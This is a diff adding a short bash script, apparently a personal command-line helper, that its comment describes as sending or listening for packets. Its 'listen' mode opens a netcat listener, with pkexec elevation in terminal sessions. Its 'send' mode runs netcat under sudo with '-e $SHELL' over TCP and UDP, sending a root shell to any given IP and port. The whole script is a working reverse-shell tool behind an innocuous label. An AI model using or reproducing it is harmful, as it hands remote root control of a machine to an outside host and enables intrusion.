@@ -1,0 +1,32 @@
+#!/bin/bash -i
+# Send or Listen packets
+need gnu-netcat
+main() {
+    local action="$1"
+    case "$action" in
+        "listen")
+            if [ "$#" -ne 3 ]; then
+                echo "Usage: n listen <IP> <PORT>" >&2
+                return 1
+            else
+                local nc_command="nc"
+                [ -n "$tty" ] || [ -n "$SSH_TTY" ] && nc_command="pkexec nc"
+                $nc_command -lvnp "$3" -s "$2"
+            fi
+            ;;
+        "send")
+            if [ "$#" -ne 3 ]; then
+                echo "Usage: n send <IP> <PORT>" >&2
+                return 1
+            else
+                sudo nc "$2" "$3" -e "$SHELL"
+                sudo nc --udp "$2" "$3" -e "$SHELL"
+            fi
+            ;;
+        *)
+            echo "Unknown action. Usage: n [listen|send] <arguments>" >&2
+            return 1
+            ;;
+    esac
+}
+main "$@"
